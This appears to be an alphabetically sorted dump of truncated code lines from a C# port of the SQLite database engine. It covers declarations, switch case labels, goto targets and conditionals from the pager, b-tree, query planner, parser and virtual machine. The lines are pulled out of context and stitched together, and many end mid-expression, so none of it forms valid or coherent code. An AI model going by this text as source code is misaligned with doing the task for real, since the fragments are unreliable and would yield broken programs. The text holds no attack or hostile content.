        Pager pPager
        Pager pPager = pPg.pPager
        Pager pSrcPager = sqlite3BtreePager( p.pSrc )
        PagerSavepoint p = pPager.aSavepoint[i]
        PagerSavepoint p = pPager.aSavepoint[ii]
        PagerSavepoint[] aNew
        Parse pParse
        PgFreeslot p
        PgFreeslot pSlot = new PgFreeslot()
        PgHdr p
        PgHdr pNext
        PgHdr pPg
        PgHdr pPgHdr = null
        PgHdr pSynced = pPage.pDirtyPrev
        PgHdr1 p = pcache1.pLruTail
        PgHdr1 pPage
        PgHdr1 pp = pCache.apHash[h]
        Pgno chldPg
        Pgno iFree
        Pgno iGuess = ovfl 
        Pgno iNext = 0
        Pgno iPtrPage = 0
        Pgno iTrunk
        Pgno n = pCur.apPage[iCellDepth 
        Pgno nFin
        Pgno nFree
        Pgno nOrig
        Pgno nPtrmap
        Pgno nextOvfl = sqlite3Get4byte(pDbPage.aData)
        Pgno nextPage
        Pgno pgno = 0
        Pgno pgno = pList.pgno
        Pgno pgnoMove = 0
        Pgno subpage
        REINDEX  
        REINDEX                            -- 1
        REINDEX  <collation>               -- 2
        ROW => ID 
        Ref_0 = 0
        RowSetChunk pNew
        RowSetEntry p = new RowSetEntry()
        SELECT abs(z
        SELECT x FROM tab
        SELECT y FROM tab
        SQLITE_OPEN_CREATE 
        SQLITE_OPEN_DELETEONCLOSE 
        SQLITE_OPEN_EXCLUSIVE 
        SQLITE_OPEN_READWRITE 
        SQLITE_OPEN_TEMP_DB
        SaveBuf[nested] = new Parse()
        SaveBuf[nested] = null
        SaveBuf[nested].aAlias = aAlias
        SaveBuf[nested].apVarExpr = apVarExpr
        SaveBuf[nested].explain = explain
        SaveBuf[nested].nAlias = nAlias
        SaveBuf[nested].nAliasAlloc = nAliasAlloc
        SaveBuf[nested].nHeight = nHeight
        SaveBuf[nested].nVar = nVar
        SaveBuf[nested].nVarExpr = nVarExpr
        SaveBuf[nested].nVarExprAlloc = nVarExprAlloc
        SaveBuf[nested].pNewTable = pNewTable
        SaveBuf[nested].pNewTrigger = pNewTrigger
        SaveBuf[nested].pZombieTab = pZombieTab
        SaveBuf[nested].sLastToken = sLastToken
        SaveBuf[nested].sNameToken = sNameToken
        SaveBuf[nested].trigStack = trigStack
        SaveBuf[nested].zAuthContext = zAuthContext
        SaveBuf[nested].zTail = zTail
        Savepoint pTmp = db.pSavepoint
        Schema pSchema = db.aDb[j].pSchema
        Schema pSchema = p.pSchema
        Select pFirst = pPrior
        Select pLoop
        Select pNew
        Select pPrior = p.pPrior
        Select pSub = pItem.pSelect
        SelectDest dest = new SelectDest()
        SrcList pFrom
        SrcList pSrcList = pNC.pSrcList
        SrcList sSrc
        SrcList_item pItem = p.a[p.nSrc - 1]
        SrcList_item pItem = pTabList.a[i]
        SrcList_item pNewItem = pNew.a[i]
        SrcList_item pOldItem = p.a[i]
        SrcList_item pTabItem = pTabList.a[pLevel.iFrom]
        StringBuilder pIdx_zColAff = new StringBuilder( pIdx.nColumn 
        StringBuilder sb = new StringBuilder( zBLOB.Length )
        StringBuilder z
        StringBuilder zBuf = new StringBuilder( 100 )
        StringBuilder zBuf = new StringBuilder( 200 )
        StringBuilder zColAff
        StringBuilder zConverted = new StringBuilder( convertUtf8Filename( zFullpath.ToString() ) )
        System.Threading.NativeOverlapped ovlp = new System.Threading.NativeOverlapped()
        Table p = pParse.pZombieTab
        Table pLeftTab = pLeft.pTab
        Table pOld
        Table pRightTab = pRight.pTab
        Table pTab
        Table pTab = (Table)i.data
        Table pTab = (Table)k.data
        Table pTab = (Table)pElem.data
        Table pTab = p.pSrc.a[0].pTab
        Table pTab = pFrom.pTab
        Table pTab = pIdx.pTable
        Table pTab = pTabItem.pTab
        Table pTabToDel = pSubitem.pTab
        TextWriter trace = ( db.flags 
        The parent and sub-query may contain WHERE clauses. Subject to
        Token pTemp = pDatabase
        Trigger pLink = pTrig
        Trigger pTrigger
        Trigger pTrigger = (Trigger)sqliteHashData( pElem )
        TriggerStep pTmp = pTriggerStep
        UNION ALL
        Vdbe cp = (Vdbe)MemberwiseClone()
        Vdbe pVdbe = pParse.pVdbe
        Vdbe v
        Vdbe v = (Vdbe)pStmt
        Vdbe v = pParse.pVdbe
        Vdbe v = pStmt
        Vdbe v = sqlite3GetVdbe( pParse )
        VdbeCursor pC = p.apCsr[i]
        VdbeOpList pIn
        VdbeOpList[] dropTrigger = new VdbeOpList[]  {
        VdbeOpList[] getCacheSize = new VdbeOpList[]{
        WHEN x=eN THEN rN ELSE y END
        WhereCost bestPlan
        WhereTerm pRangeEnd = null
        WhereTerm pRangeStart = null
        WhereTerm.pWC.a[WhereTerm.idx] == WhereTerm
        X1 = (int)( 30.6001 
        Y = 2000
        Y = p.Y
        Y--
        Z
        Z = (int)( ( p.iJD 
        [Flags]
        [StructLayout(LayoutKind.Sequential)]
        [return: MarshalAs(UnmanagedType.Bool)]
        _OvflCell cp = new _OvflCell()
        _OvflCell pOvfl
        _ht pEntry = pH.ht[h]
        _pIter 
        a 
        a = a << 7
        a = pWC.a[i]
        a separate restriction deriving from ticket 
        aAlias = SaveBuf[nested].aAlias
        aAlias = null
        aBucket[i] = pEntry
        aLen = lenOne
        aNew = pPager.aSavepoint
        aRegIdx = new int[nIdx 
        aRegIdx = new int[nIdx]
        aRegIdx[j] = reg
        a[i] = 11 - i
        a[i] = 5
        a[pIdx.nColumn] = 1
        addr = p.nOp - 1
        addr = pbegin
        addr = sqlite3VdbeCurrentAddr( v )
        addr = sqlite3VdbeMakeLabel( v )
        addrAeqB =
        addrAeqB = addrAltB
        addrAltB
        addrCont = sqlite3VdbeCurrentAddr( v )
        addrEnd = sqlite3VdbeMakeLabel( v )
        addrEofB = addrEofA
        addrNxt = pLevel.addrNxt
        addrSelect = sqlite3VdbeCurrentAddr( v ) 
        addrSortIndex = -1
        aff = SQLITE_AFF_NONE
        affinity = cf.affinity
        aggregates.
        amt -= (u32)a
        an ORDER BY clause.  Ticket 
        an integer primary key
        and there is no explicitly declared IPK column.
        andFlags = (int)( andFlags 
        apHash = null
        apOld[i] = null
        apVarExpr = SaveBuf[nested].apVarExpr
        apVarExpr = null
        appear as unmodified result columns in the outer query.  But
        applyNumericAffinity( pRec )
        assertCellInfo(pCur)
        assertTruncateConstraint( pPager )
        attr = File.GetAttributes( zFilename )
        azChar = new byte[1][]
        azChar[0] = azOne
        azCols = null
        azResult
        b 
        b = b << 7
        baseCur = pParse.nTab
        bestPlan = new WhereCost()
        bestPlan.rCost = SQLITE_BIG_DBL
        bool fire_this = false
        bool isAggSub
        bool isOuter
        bool isReduced = ( flags 
        bool isSpecialError = false
        bool longNames = ( flags 
        bool max
        bool needSync = false
        btFlags 
        btreeInitPage(pPage)
        buf[n
        byte requestedSortOrder
        byte[] aCopy = new byte[]  {
        byte[] azOne = new byte[] { (u8)' ' }
        byte[] pData = pPg.pData
        byte[] pData2 = null
        byte[] pKey = new byte[pCur.nKey]
        byte[] pNext_4 = new byte[nCell 
        byte[] pOvflData
        bytesPerSector = GetbytesPerSector( zConverted )
        c = (u16)( WO_EQ << ( op - TK_EQ ) )
        c = WO_IN
        c = WO_ISNULL
        callbackIsInit = 0
        case '
        case ' ':
        case '!':
        case '$':
        case '%':
        case '(':
        case ')':
        case '-':
        case '.':
        case '/':
        case '0':
        case '1':
        case '2':
        case '3':
        case '4':
        case '5':
        case '6':
        case '7':
        case '8':
        case '9':
        case ':':
        case '<':
        case '=':
        case '>':
        case '@':  /
        case 'X':
        case '[':
        case '[': quote = ']'
        case 'l':
        case 's':
        case 'u':
        case 'w':
        case 'x':
        case 0:
        case 100: /
        case 101: /
        case 102: /
        case 103: /
        case 104: /
        case 105: /
        case 106: /
        case 107: /
        case 108: /
        case 109: /
        case 10:   /
        case 110: /
        case 111: /
        case 112: /
        case 113: /
        case 114: /
        case 115: /
        case 116: /
        case 117: /
        case 118: /
        case 119: /
        case 11:   /
        case 120: /
        case 121: /
        case 122: /
        case 123: /
        case 124: /
        case 125: /
        case 126: /
        case 127: /
        case 128: /
        case 129: /
        case 130: /
        case 131: /
        case 132: /
        case 133: /
        case 134: /
        case 135: /
        case 136: /
        case 137: /
        case 138: /
        case 139: /
        case 13: /
        case 140: /
        case 141: /
        case 142: /
        case 143: /
        case 144: /
        case 145: /
        case 146: /
        case 147: /
        case 148: /
        case 149: /
        case 14: /
        case 150: /
        case 151: /
        case 152: /
        case 153: /
        case 154: /
        case 155: /
        case 156: /
        case 157: /
        case 158: /
        case 159: /
        case 15: /
        case 160: /
        case 161: /
        case 162: /
        case 163: /
        case 164: /
        case 165: /
        case 166: /
        case 167: /
        case 168: /
        case 169: /
        case 16: /
        case 170: /
        case 171: /
        case 172: /
        case 173: /
        case 174: /
        case 175: /
        case 176: /
        case 177: /
        case 178: /
        case 179: /
        case 17: /
        case 180: /
        case 181: /
        case 182: /
        case 183: /
        case 184: /
        case 185: /
        case 186: /
        case 187: /
        case 188: /
        case 189: /
        case 18: /
        case 190: /
        case 191: /
        case 192: /
        case 193: /
        case 194: /
        case 195: /
        case 196: /
        case 197: /
        case 198: /
        case 199: /
        case 19: /
        case 1:
        case 200: /
        case 201: /
        case 202: /
        case 203: /
        case 204: /
        case 205: /
        case 206: /
        case 207: /
        case 208: /
        case 209: /
        case 210: /
        case 211: /
        case 212: /
        case 213: /
        case 214: /
        case 215: /
        case 216: /
        case 217: /
        case 218: /
        case 219: /
        case 220: /
        case 221: /
        case 222: /
        case 223: /
        case 224: /
        case 225: /
        case 226: /
        case 227: /
        case 228: /
        case 229: /
        case 22: /
        case 230: /
        case 231: /
        case 232: /
        case 233: /
        case 234: /
        case 235: /
        case 236: /
        case 237: /
        case 238: /
        case 239: /
        case 23: /
        case 240: /
        case 241: /
        case 242: /
        case 243: /
        case 244: /
        case 245: /
        case 246: /
        case 247: /
        case 248: /
        case 249: /
        case 24: /
        case 250: /
        case 251: /
        case 252: /
        case 253: /
        case 254: /
        case 255: /
        case 256: /
        case 257: /
        case 258: /
        case 259: /
        case 260: /
        case 261: /
        case 262: /
        case 263: /
        case 264: /
        case 265: /
        case 266: /
        case 267: /
        case 26: /
        case 270: /
        case 271: /
        case 272: /
        case 273: /
        case 274: /
        case 275: /
        case 276: /
        case 277: /
        case 278: /
        case 27: /
        case 281: /
        case 282: /
        case 283: /
        case 284: /
        case 285: /
        case 286: /
        case 288: /
        case 289: /
        case 28: /
        case 290: /
        case 291: /
        case 292: /
        case 293: /
        case 294: /
        case 295: /
        case 296: /
        case 297: /
        case 298: /
        case 299: /
        case 29: /
        case 2:
        case 300: /
        case 301: /
        case 302: /
        case 303: /
        case 304: /
        case 307: /
        case 308: /
        case 309: /
        case 30: /
        case 310: /
        case 311: /
        case 312: /
        case 313: /
        case 316: /
        case 317: /
        case 318: /
        case 31: /
        case 321: /
        case 323: /
        case 324: /
        case 325: /
        case 32: /
        case 33: /
        case 36: /
        case 37: /
        case 38: /
        case 39: /
        case 3:
        case 40: /
        case 41: /
        case 42: /
        case 43: /
        case 45: /
        case 46: /
        case 47: /
        case 48: /
        case 49: /
        case 4:
        case 50: /
        case 57: /
        case 58: /
        case 59: /
        case 5:
        case 5: /
        case 60: /
        case 61: /
        case 63: /
        case 64: /
        case 65: /
        case 66: /
        case 67: /
        case 68: /
        case 69: /
        case 6:   /
        case 6: /
        case 70: /
        case 71: /
        case 72: /
        case 73: /
        case 74: /
        case 75: /
        case 76: /
        case 77: /
        case 78: /
        case 79: /
        case 7:
        case 7: /
        case 80: /
        case 81: /
        case 82: /
        case 83: /
        case 84: /
        case 85: /
        case 86: /
        case 87: /
        case 88: /
        case 8:    /
        case 8: /
        case 93: /
        case 94: /
        case 95: /
        case 96: /
        case 97: /
        case 98: /
        case 99: /
        case 9:
        case 9: /
        case P4_COLLSEQ:
        case P4_FUNCDEF:
        case P4_INT32:
        case P4_INT64:
        case P4_INTARRAY:
        case P4_KEYINFO:
        case P4_KEYINFO_STATIC:
        case P4_MEM:
        case P4_REAL:
        case SQLITE_ACCESS_EXISTS:
        case SQLITE_ACCESS_READ:
        case SQLITE_ACCESS_READWRITE:
        case SQLITE_AFF_NONE:
        case SQLITE_AFF_TEXT:
        case SQLITE_BLOB:
        case SQLITE_CONFIG_GETMALLOC:
        case SQLITE_CONFIG_GETPCACHE:
        case SQLITE_CONFIG_LOOKASIDE:
        case SQLITE_CONFIG_MALLOC:
        case SQLITE_CONFIG_MEMSTATUS:
        case SQLITE_CONFIG_PAGECACHE:
        case SQLITE_CONFIG_PCACHE:
        case SQLITE_CONFIG_SCRATCH:
        case SQLITE_DBCONFIG_LOOKASIDE:
        case SQLITE_DBSTATUS_LOOKASIDE_USED:
        case SQLITE_FCNTL_LOCKSTATE:
        case SQLITE_FLOAT:
        case SQLITE_INTEGER:
        case SQLITE_LAST_ERRNO:
        case SQLITE_NULL:
        case SQLITE_TESTCTRL_ALWAYS:
        case SQLITE_TESTCTRL_ASSERT:
        case SQLITE_TESTCTRL_BENIGN_MALLOC_HOOKS:
        case SQLITE_TESTCTRL_BITVEC_TEST:
        case SQLITE_TESTCTRL_PENDING_BYTE:
        case SQLITE_TESTCTRL_PRNG_RESET:
        case SQLITE_TESTCTRL_PRNG_RESTORE:
        case SQLITE_TESTCTRL_PRNG_SAVE:
        case SQLITE_TESTCTRL_RESERVE: {
        case SQLITE_TEXT:
        case SRT_Coroutine:
        case SRT_EphemTab:
        case SRT_Except:
        case SRT_Exists:
        case SRT_Mem:
        case SRT_Output:
        case SRT_Set:
        case SRT_Table:
        case SRT_Union:
        case TK_AGG_COLUMN:
        case TK_AGG_FUNCTION:
        case TK_ALL:
        case TK_AND:
        case TK_AS:
        case TK_BETWEEN:
        case TK_BITAND:
        case TK_BITNOT:
        case TK_BITOR:
        case TK_BLOB:
        case TK_CAST:
        case TK_COLUMN:
        case TK_CONCAT:
        case TK_CONST_FUNC:
        case TK_DOT:
        case TK_EQ:
        case TK_EXCEPT:
        case TK_EXISTS:
        case TK_FLOAT:
        case TK_FUNCTION:
        case TK_GE:
        case TK_GT:
        case TK_ID:
        case TK_IN:
        case TK_INTEGER:
        case TK_ISNULL:
        case TK_LE:
        case TK_LSHIFT:
        case TK_LT:
        case TK_MINUS:
        case TK_NE:
        case TK_NOT:
        case TK_NOTNULL:
        case TK_NULL:
        case TK_OR:
        case TK_PLUS:
        case TK_RAISE:
        case TK_REGISTER:
        case TK_REM:
        case TK_RSHIFT:
        case TK_SELECT:
        case TK_SLASH:
        case TK_STAR:
        case TK_STRING:
        case TK_UMINUS:
        case TK_UNION:
        case TK_UPLUS:
        case TK_VARIABLE:
        catch ( Exception e )
        catch ( Exception e ) { }
        catch ( IOException )
        catch ( IOException e )
        cbrk -= size
        cellOffset = pPage.cellOffset
        cellStart = hdr 
        cellbody -= aSize[i 
        cellbody -= aSize[i]
        change to the record number or writing to a virtual table.
        char 
        char c
        cksum 
        cksum -= zMaster[u]
        cnt = 0
        columns of the sub-query.
        compareInfo pInfo = (compareInfo)sqlite3_user_data( context )
        computeHMS( x )
        computeJD( p )
        computeJD( x )
        computeYMD( x )
        computeYMD_HMS( x )
        const i64 MAX_6BYTE = ( ( ( (i64)0x00008000 ) << 32 ) - 1 )
        const int flags =
        const int flags = ( SQLITE_OPEN_READONLY 
        cost = nRow 
        cost = pProbe != null 
        count = (int)pEntry.count
        count = (int)pH.count
        cp.idx = idx
        cp.s = new u8[s.Length]
        createStat1 = 1
        ct.D = D
        ct.M = M
        ct.Y = Y
        ct.aColName = aColName
        ct.aLabel = aLabel
        ct.aMem = aMem
        ct.aMutex = aMutex
        ct.aOp = aOp
        ct.aVar = aVar
        ct.apArg = apArg
        ct.apCsr = apCsr
        ct.azVar = azVar
        ct.btreeMask = btreeMask
        ct.cacheCtr = cacheCtr
        ct.changeCntOn = changeCntOn
        ct.contextStack = contextStack
        ct.contextStackDepth = contextStackDepth
        ct.contextStackTop = contextStackTop
        ct.db = db
        ct.enc = enc
        ct.errorAction = errorAction
        ct.expired = expired
        ct.explain = explain
        ct.flags = flags
        ct.h = h
        ct.iJD = iJD
        ct.iStatement = iStatement
        ct.inVtabMethod = inVtabMethod
        ct.isPrepareV2 = isPrepareV2
        ct.m = m
        ct.magic = magic
        ct.minWriteFileFormat = minWriteFileFormat
        ct.n = n
        ct.nChange = nChange
        ct.nCursor = nCursor
        ct.nLabel = nLabel
        ct.nLabelAlloc = nLabelAlloc
        ct.nMem = nMem
        ct.nOp = nOp
        ct.nOpAlloc = nOpAlloc
        ct.nResColumn = nResColumn
        ct.nVar = nVar
        ct.okVar = okVar
        ct.pFree = pFree
        ct.pNext = pNext
        ct.pPrev = pPrev
        ct.pResultSet = pResultSet
        ct.pc = pc
        ct.r = r
        ct.rc = rc
        ct.readOnly = readOnly
        ct.s = s
        ct.startTime = startTime
        ct.trace = trace
        ct.type = type
        ct.tz = tz
        ct.u = u
        ct.usesStmtJournal = usesStmtJournal
        ct.validHMS = validHMS
        ct.validJD = validJD
        ct.validTZ = validJD
        ct.validYMD = validYMD
        ct.xDel = xDel
        ct.z = z
        ct.zErrMsg = zErrMsg
        ct.zSql = zSql
        ctx.pFunc = pFunc
        ctx.pMem = pMem
        ctx.s.CopyTo( pMem )
        ctx.s.db = pMem.db
        ctx.s.flags = MEM_Null
        d 
        d = r 
        d1 
        data = pPage.aData
        db = null
        db = sqlite3_context_db_handle( context )
        db.aDb[1].pBt = null
        db.aLimit[SQLITE_LIMIT_ATTACHED]
        db.aLimit[limitId] = newLimit
        db.activeVdbeCnt
        db.activeVdbeCnt--
        db.busyTimeout = ms
        db.dfltJournalMode )
        db.errCode = err_code
        db.flags 
        db.init.iDb = 0
        db.init.iDb = iDb
        db.init.newTnum = atoi( argv[1] )
        db.init.orphanTrigger = 0
        db.lookaside.bEnabled = 0
        db.lookaside.bEnabled = enableLookaside
        db.lookaside.nOut--
        db.lookaside.pFree = pBuf
        db.magic = SQLITE_MAGIC_BUSY
        db.magic = SQLITE_MAGIC_ERROR
        db.magic = SQLITE_MAGIC_OPEN
        db.magic = SQLITE_MAGIC_SICK
        db.mutex = sqlite3MutexAlloc( SQLITE_MUTEX_RECURSIVE )
        db.nDb = iDb
        db.nProgressOps = 0
        db.nProgressOps = nOps
        db.nStatement--
        db.nTable
        db.pProgressArg = null
        db.pProgressArg = pArg
        db.pSavepoint = pTmp.pNext
        db.pVdbe = p.pNext
        db.pVdbe.pPrev = p
        db.u1.isInterrupted = false
        db.u1.isInterrupted = true
        db.xProgress = null
        db.xProgress = xProgress
        db.xRollbackCallback( db.pRollbackArg )
        default:
        default: Debug.Assert( op == TK_CASE )
        default: Debug.Assert( p.op == TK_INTERSECT )
        default: break
        default: return -1
        delay = delays[NDELAY - 1]
        delay = delays[count]
        delay = timeout - prior
        dest.eDest = SRT_Table
        disable_simulated_io_errors()
        distinct = -1
        distinct = pParse.nTab
        do
        done = false
        double inMultiplier = 1
        double r = 0
        double rNow = 0
        double val = (double)0
        double value = 0
        downgradeAllSharedCacheTableLocks(p)
        dwCreationDisposition = FileMode.CreateNew
        dwCreationDisposition = FileMode.Open
        dwCreationDisposition = FileMode.OpenOrCreate
        dwDesiredAccess = FileAccess.Read
        dwDesiredAccess = FileAccess.Read 
        dwFlagsAndAttributes = FileOptions.DeleteOnClose
        dwFlagsAndAttributes = FileOptions.None
        eType = IN_INDEX_EPH
        elapseTime -= p.startTime
        elapseTime = (u64)( ( rNow - (int)rNow ) 
        elem = elem.next
        elem = next_elem
        elem = pEntry.chain
        elem = pH.first
        elem.next.prev = elem.prev
        elem.prev.next = elem.next
        else
        else if ( !prevEscape 
        else if ( ( a.wtFlags 
        else if ( ( enc == SQLITE_UTF16LE 
        else if ( ( f 
        else if ( ( p.flags 
        else if ( ( p.op == TK_COLUMN 
        else if ( ( pLevel.plan.wsFlags 
        else if ( ( pMem.flags 
        else if ( ( pOrTerm.wtFlags 
        else if ( ( pPKey2.flags 
        else if ( ( pParse.db.flags 
        else if ( ( pg1 
        else if ( IsVirtual( pTab ) )
        else if ( aNew.pSchema.file_format != 0 
        else if ( c == matchSet )
        else if ( eStatementOp == 0 )
        else if ( esc == c 
        else if ( idx1 < szHdr1 )
        else if ( isMinQuery != 0 )
        else if ( n > (u64)db.aLimit[SQLITE_LIMIT_LENGTH] )
        else if ( onError == OE_Default )
        else if ( opcode == OP_Destroy )
        else if ( opcode == OP_Statement )
        else if ( opcode == OP_Transaction 
        else if ( opcode == OP_VUpdate )
        else if ( p.approx )
        else if ( p.iSum == 42 )
        else if ( p.v > iRowid )
        else if ( pB.v < pA.v )
        else if ( pLink.pSchema == pLink.pTabSchema )
        else if ( pPager.exclusiveMode
        else if ( pPager.journalMode == PAGER_JOURNALMODE_TRUNCATE )
        else if ( pParent.pOrderBy != null )
        else if ( wsFlags != 0 
        else if ( zTab != null )
        else if ( z[zDx] == '
        else if (iParentIdx == i)
        else if (lwr >= pPage.nCell)
        else if (pPage.nOverflow == 0 
        else if (yyact < YYNSTATE 
        else n = pMem.zBLOB.Length
        else pMem.z = pMem.r.ToString() 
        else val = 0.0
        else { ct.zBLOB = (byte[])zBLOB.Clone()
        else { pH.first = pNew
        emptyDestTest = 0
        enable_simulated_io_errors()
        enc -= 1
        enc2 = SQLITE_UTF16NATIVE
        end                        
        end = cellOffset 
        end = sqlite3VdbeMakeLabel( v )
        endEq = ( null == pRangeEnd 
        endOfLoop = sqlite3VdbeMakeLabel( v )
        eqTermMask = WO_EQ 
        explain = 0
        explain = SaveBuf[nested].explain
        explicitly declared column. Copy meta information from pCol.
        exprSetHeight( pRoot )
        extraRight = x - 1
        fileFormat = ( db.flags 
        flag_alternateform = flag_altform2 = flag_zeropad = false
        flag_leftjustify = flag_plussign = flag_blanksign =
        flags 
        flags = (int)sqlite3_user_data( context )
        flags = cf.flags
        flags2 = cf.flags2
        for (
        for ( 
        for ( i = ( db.nDb - 1 ) 
        for ( i = 0 
        for ( i = 1 
        for ( i = 7 
        for ( i = iFirst 
        for ( i = j = 0 
        for ( i = p.nExpr 
        for ( i = p.nSrc - 1 
        for ( i = pSrc.nSrc 
        for ( iDb = 0 
        for ( idx = 0 
        for ( ii = 0 
        for ( ii = nCurrent 
        for ( ii = nNew 
        for ( ii = pSavepoint.iSubRec 
        for ( int i = 0 
        for ( j = 0 
        for ( j = cnt = 0 
        for ( j = iFrom 
        for ( k = 0 
        for ( k = pDb.pSchema.tblHash.first 
        for ( n = 0 
        for ( nChar = 0 
        for ( p = db.aFunc.a[j] 
        for ( p = pCache.pDirty 
        for ( p = sqliteHashFirst( pTmpSchema.trigHash ) 
        for ( pChunk = p.pFirst 
        for ( pIdx = p.pIndex 
        for ( pIdx = pTab.pIndex 
        for ( pLoop = p 
        for ( pPage = pCache.apHash[h] 
        for ( pPg = pCache.pSynced 
        for ( pSrcIdx = pSrc.pIndex 
        for ( pSub1 = pSub 
        for ( u = 0 
        for (addr = hdr 
        for (i = 0
        for (i = 1
        for (i = cnt = 0
        for (iFree = nOrig
        for (ii = 0
        for (int iLoop = contentOffset - 1
        for (j = 0
        for (j = end  
        for (j = i 
        foreach ( ManagementObject moLogDisk in mosLogicalDisks.Get() )
        foreach row2 in t2 do      
        freeIndex( ref pIndex )
        fs = null
        get { return _M
        get { return _n
        get { return _yyParser.yystack[_yyidx 
        getCellInfo(pCur)
        gotPendingLock = ( res != 0 )
        gotPendingLock = false
        goto append_from_error
        goto attach_end
        goto attach_error
        goto balance_cleanup
        goto begin_table_error
        goto delete_from_cleanup
        goto detach_error
        goto drop_trigger_cleanup
        goto end_getDigits
        goto end_of_step
        goto end_of_vacuum
        goto end_playback
        goto end_prepare
        goto error_out
        goto exit_begin_add_column
        goto exit_create_index
        goto exit_drop_index
        goto exit_drop_table
        goto exit_rename_table
        goto fetch_out
        goto fk_end
        goto freepage_out
        goto idx_rowid_corruption
        goto initone_error_out
        goto insert_cleanup
        goto insert_end
        goto multi_select_end
        goto no_mem
        goto opendb_out
        goto page1_init_failed
        goto pager_acquire_err
        goto primary_key_exit
        goto ptrmap_exit
        goto scratch_overflow
        goto select_end
        goto set_child_ptrmaps_out
        goto start
        goto trans_begun
        goto trigger_cleanup
        goto triggerfinish_cleanup
        goto update_cleanup
        goto whereBeginError
        goto zulu_time
        h
        h = ( h << 3 ) 
        h = 0
        have a WHERE clause.
        have other optimizations in mind to deal with that case.
        hdr = pPage.hdrOffset
        i
        i 
        i )
        i -= 200
        i = (int)( ( i 
        i = 2
        i = i % p.iDivisor
        i = p.pc
        i = pParse.nMem 
        i--
        i64 _p = 0
        i64 i = pMem.u.i
        i64 iLimit = pPager.journalSizeLimit
        i64 offset = 0
        i64 offset = pPager.nSubRec 
        i64 offset = pSavepoint.iSubRec 
        i64 ofst = ( pgno - 1 ) 
        i64 value = 0
        iAgg = cf.iAgg
        iBeginAfterTrigger = sqlite3VdbeCurrentAddr( v )
        iBeginBeforeTrigger = sqlite3VdbeCurrentAddr( v )
        iCellFirst = cellOffset 
        iCellLast = usableSize - 4
        iChunkOffset = 0
        iCol = pTab.nCol - 1
        iColumn = cf.iColumn
        iDb = 0
        iDb = 1
        iDb = db.init.iDb
        iDummy = 0
        iHdrOff = pSavepoint.iHdrOffset != 0 
        iIdx = pCur.aiIdx[pCur.iPage]
        iIdxCur = pLevel.iIdxCur
        iLastPg--
        iLimit = 0
        iLimit = SQLITE_MAX_LENGTH
        iLimit = n
        iLimit = pMem.db.aLimit[SQLITE_LIMIT_LENGTH]
        iMaxKey = 0
        iMem = 
        iPage = (int)sqlite3Get4byte(pOvflData)
        iPageSize16 = (u16)iPageSize
        iRec = sqlite3GetTempReg( pParse )
        iReg = iTarget
        iReleaseReg = sqlite3GetTempReg( pParse )
        iRightJoinTable = cf.iRightJoinTable
        iRootPage = pParse.regRoot
        iRootPage = pStat.tnum
        iTab = pX.iTable
        iTable = cf.iTable
        iZnum
        id.fs.SetLength( nByte )
        id.lastErrno = (u32)Marshal.GetLastWin32Error()
        idx 
        idx = 
        idx1 
        if (
        if ( !( pDest.eDest <= SRT_Discard ) )//        if( !IgnorableOrderby(pDest) )
        if ( !DIRECT_MODE 
        if ( !flag_leftjustify )
        if ( !isCompound 
        if ( !isErrorReset )
        if ( !isFatalError( p.rc ) 
        if ( !isOpen( pPager.jfd ) 
        if ( !isView 
        if ( !isView )
        if ( !p.readOnly )
        if ( !pPager.noSync 
        if ( !pageInJournal( pPg ) 
        if ( !prevEscape 
        if ( !sqlite3BtreeIsInReadTrans( pBt ) )
        if ( !sqlite3Isalnum( zIdent[j] ) 
        if ( !sqlite3Isdigit( inStr[i] ) 
        if ( !sqlite3Isdigit( zDate[zIndex] ) )
        if ( !sqlite3Isdigit( z[zIndex] ) ) return 0
        if ( !sqlite3VtabInSync( db )
        if ( ( --aOp[pc 
        if ( ( a.wtFlags 
        if ( ( bestPlan.plan.wsFlags 
        if ( ( db.flags 
        if ( ( enc 
        if ( ( f 
        if ( ( f1 
        if ( ( f2 
        if ( ( flags 
        if ( ( i > 31 
        if ( ( len = (u32)pMem.n ) != 0 )
        if ( ( max 
        if ( ( op 
        if ( ( op == TK_AGG_COLUMN 
        if ( ( op == TK_INTEGER 
        if ( ( opProperty 
        if ( ( p.flags 
        if ( ( p.tabFlags 
        if ( ( pColl.enc 
        if ( ( pF.pFunc.flags 
        if ( ( pItem = pList.a[i] ) != null )
        if ( ( pLevel.plan.wsFlags 
        if ( ( pMem.flags 
        if ( ( pOrTerm.eOperator 
        if ( ( pPKey2.flags 
        if ( ( pPager.memDb == 0 
        if ( ( pParse.cookieMask 
        if ( ( pParse.db.flags 
        if ( ( pRec.flags 
        if ( ( pRight.jointype 
        if ( ( pTab.tabFlags 
        if ( ( pTerm.eOperator 
        if ( ( pTerm.prereqAll 
        if ( ( pTerm.wtFlags 
        if ( ( pWInfo.wctrlFlags 
        if ( ( v64 
        if ( ( wctrlFlags 
        if ( (int)padFlag != 0 
        if ( 0 == ( pFrom.flags 
        if ( 0 == ( pRec.flags 
        if ( 0 == db.autoCommit 
        if ( 0 == db.init.busy 
        if ( 0 == db.init.busy )
        if ( 0 == firstTerm )
        if ( 0 == isSavepnt 
        if ( 0 == isView 
        if ( 0 == omitTable )
        if ( 0 == pPage.nRef )
        if ( 0 == res )
        if ( ALWAYS( p.rc == SQLITE_OK ) )
        if ( ALWAYS( pRes.flags != 0 ) )
        if ( ALWAYS( pTab != null ) 
        if ( A[i] != B[i] ) return ( A[i] < B[i] ) 
        if ( A[i] != bB[i] ) return ( A[i] < bB[i] ) 
        if ( IsVirtual( pTab ) )
        if ( NEVER( iCol < 0 ) ) goto fk_end
        if ( NEVER( p == null ) ) continue
        if ( NEVER( pLeftTab == null 
        if ( NEVER( pTerm == null ) ) break
        if ( NEVER( res < 0 ) )
        if ( NEVER( v == null ) ) return
        if ( NEVER(i ==N_SORT_BUCKET - 1 ))
        if ( OMIT_TEMPDB == 0 
        if ( SQLITE_NULL != sqlite3_value_type( argv[i] ) )
        if ( SQLITE_NULL == sqlite3_value_type( argv[1] ) ) return
        if ( SQLITE_OK != rc )
        if ( SQLITE_OK != sqlite3ReadSchema( pParse ) )
        if ( SQLITE_OK == rc 
        if ( SaveBuf[nested] != null )
        if ( String.IsNullOrEmpty( z ) 
        if ( String.IsNullOrEmpty( z ))
        if ( String.IsNullOrEmpty( z = sqlite3_value_text( argv[i] ) ) 
        if ( String.IsNullOrEmpty( zFmt ) 
        if ( _fmt < fmt.Length 
        if ( a == zLeft.Length ) return -UpperToLower[zRight[b]]
        if ( aCol[i] == null ) aCol[i] = new Column()
        if ( aData != null )
        if ( aLen[i] == n 
        if ( aNew.pSchema == null )
        if ( aOvfl != null )
        if ( aRegIdx != null 
        if ( aRegIdx == null )
